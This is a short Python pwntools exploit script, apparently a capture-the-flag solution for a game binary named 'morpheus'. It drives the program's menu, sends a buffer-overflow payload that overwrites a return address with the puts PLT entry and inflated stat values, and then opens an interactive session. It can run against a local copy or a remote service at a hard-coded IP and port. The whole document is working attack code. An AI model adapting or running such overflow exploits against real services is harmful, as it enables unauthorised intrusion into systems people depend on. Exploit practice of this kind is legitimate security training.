from pwn import *
import sys

binary = ELF("./morpheus")

def battle():
    p.sendlineafter("Choice:", "4")

def change_name():
    p.sendlineafter("Choice:", "1")
    p.sendlineafter("ID:", "2")

def exploit(target):
    change_name()
    padding = 48
    valid_addr = binary.symbols["plt.puts"]
    payload = "A" * padding
    payload += p32(valid_addr)
    payload += p32(0)
    payload += p32(2000000000) * 2
    p.sendline(payload)
    battle()
    p.interactive()
    

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")     
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./morpheus")
        log.info("Running exploit on local\n")
        exploit(p)
    elif sys.argv[1] == "remote":
        p = remote("103.200.7.150", 14004)
        log.info("Running exploit on remote\n")
        exploit(p)
    else:
        sys.exit(0)
